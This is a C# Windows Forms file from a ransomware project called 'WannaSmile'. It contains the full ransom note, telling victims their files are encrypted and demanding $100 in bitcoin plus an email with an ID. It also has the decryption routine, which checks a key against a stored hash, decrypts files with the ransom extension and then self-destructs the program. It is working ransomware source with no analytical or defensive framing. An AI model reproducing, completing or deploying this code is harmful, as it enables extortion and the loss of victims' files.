using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace WannaSmile
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            ShowInTaskbar = false;
            textBox1.Text = Program.szMail;
            textBox2.Text = Program.szID;

            webBrowser1.DocumentText = "<big><b>What Happened to My Computer?</b></big></br>Your important files are encrypted.Many of your documents, photos, videos, databases and other flies are no longer accessible because they have been encrypted. Maybe you are busy looking fora way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service.</br></br><big><b>Can I Recover My Files?</b></big></br>Sure. We guarantee that you can recover all your files safely and easily. Don't try to guess the password, its a strong one and even if you try to bruteforce it you will spend more money and resources guessing it, rather then paying to us.</br>To recover your files you will need to enter a secret key in the <b>Key</b> box and press Decrypt button.</br></br><big><b>How do I get the decrypt key?</b></big></br>To get your decrypt key you must send an payment of bitcoin of 100$ worth to the bitcoin adress you see below. Also include text id in the bitcoin transaction. You can find it one the left at <b>Text ID</b> field. After you sent payment, send an email to the adress below with same textid you attached to bitcoin transaction, its very important, only the textid can proove you send the transaction. The decryption key will be send to you to the same email, if no other email is included in the mail message.<br><br> Good look and hf ;)";
        }

        private void Form1_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.DrawRectangle(new Pen(Color.Crimson, 3),
                            this.DisplayRectangle);
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://en.wikipedia.org/wiki/Bitcoin");
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://localbitcoins.com");
        }

        private void textBox1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            Clipboard.SetText(textBox1.Text);
        }

        private void textBox2_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            Clipboard.SetText(textBox2.Text);
        }    

        private void button1_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(textBox3.Text);
        }

        private void textBox3_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            Clipboard.SetText(textBox3.Text);       
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if(Crypto.hash.VerifyHash(textBox4.Text, Program.szHash))
            {
                MessageBox.Show("Key is correct! File Decryption Process Started. Click OK and wait for process to finish.");           
            
                progressBar1.Visible = true;                 
                label9.Visible = true;
                label9.Text = "0%";
                label9.BringToFront();              
                label9.Update();
                progressBar1.Update();
               

                var files = Program.FindSupportedFiles(Program.get_user_path());
                string fname;
                byte[] pass = Encoding.ASCII.GetBytes(textBox4.Text);
               
                foreach (string s in files)
                {
                    if (!s.EndsWith(Program.szExtension, StringComparison.OrdinalIgnoreCase))
                        continue;

                    fname = s.Substring(0, s.Length - Program.szExtension.Length);
                    if (!Crypto.hash.AES_Decrypt(s, fname, pass))
                        continue;
                    try { File.Delete(s); }
                    catch { continue; }
                }
                File.Delete(Program.get_data_path());
                
                progressBar1.Increment(100);
                label9.Text = "100%";
                label9.BackColor = ColorTranslator.FromHtml("#06b025");

                DialogResult result = MessageBox.Show("Decryption Successfuly Finished! Click OK to forget about this nightmare forever.", "Confirmation", MessageBoxButtons.OK);
                if (result == DialogResult.OK)
                {
                    Program.SelfDestruct();
                    Environment.Exit(0);
                }
            }
            else
            {
                MessageBox.Show("Incorrect Decrypt Key!");
            }

        }
    }
}
